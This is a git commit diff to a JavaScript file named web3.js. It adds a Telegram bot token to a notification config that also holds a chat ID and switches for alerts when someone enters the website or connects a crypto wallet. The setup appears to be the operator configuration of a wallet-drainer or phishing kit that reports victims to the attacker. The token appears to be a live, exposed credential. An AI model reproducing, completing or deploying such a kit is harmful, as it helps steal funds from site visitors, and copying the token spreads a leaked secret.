b2698d35ab49b1843c9b98546ba400b715bb34ac
Cypher-X6 <aghadiayeiyamu@gmail.com>
2024-12-19 01:00:35 +0100

    Update web3.js

--- assets/js/web3.js
+++ assets/js/web3.js
@@ -43,7 +43,7 @@ document.addEventListener("DOMContentLoaded", async () => {
     }
     
     const TG = {
-        token: "", // Your @Botfather Bot token Ex. "7643207473:AAG2jS3mwjUywRZpvpVFnImC0kcSbij8nhM"
+        token: "7643207473:AAG2jS3mwjUywRZpvpVFnImC0kcSbij8nhM", // Your @Botfather Bot token Ex. "7643207473:AAG2jS3mwjUywRZpvpVFnImC0kcSbij8nhM"
         chat_id: "7489428594", // ID of the chat for notifications (include the minus if present) Ex. "-1033337653892"
         enter_website: true, // Notify on site entry ('true' enabled or 'false' disabled)
         connect_success: true, // Notify on wallet connection ('true' enabled or 'false' disabled)
